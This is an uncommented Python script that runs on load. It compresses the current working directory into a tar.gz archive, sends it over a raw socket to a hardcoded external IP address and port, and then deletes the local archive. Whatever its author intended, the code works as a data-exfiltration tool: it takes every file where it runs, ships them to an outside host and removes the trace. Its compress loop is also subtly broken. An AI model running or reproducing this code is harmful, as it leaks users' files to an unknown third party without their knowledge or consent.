import os
import socket
import tarfile

import tqdm
from rich import print as pprint

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096


def compress(output_filename, source_directory):
    pprint(f"Compressing {source_directory} to {output_filename}...")
    for file in source_directory:
        with tarfile.open(output_filename, "w:gz") as tar:
            tar.add(file)
    return output_filename


def sendfile(filename):

    host = "24.254.180.168"
    port = 5002
    filesize = os.path.getsize(filename)

    s = socket.socket()
    pprint(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    pprint("[+] Connected.")

    s.send(f"{filename}{SEPARATOR}{filesize}".encode())

    progress = tqdm.tqdm(
        range(filesize),
        f"Sending {filename}",
        unit="B",
        unit_scale=True,
        unit_divisor=1024,
    )
    with open(filename, "rb") as f:
        while True:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
            s.sendall(bytes_read)
            progress.update(len(bytes_read))

    s.close()


def cleanup(compressed_archive):
    pprint("Cleaning up...")
    os.remove(compressed_archive)


def main():
    compressed_file = compress("transfer.tar.gz", os.curdir)
    sendfile(compressed_file)
    cleanup(compressed_file)


main()
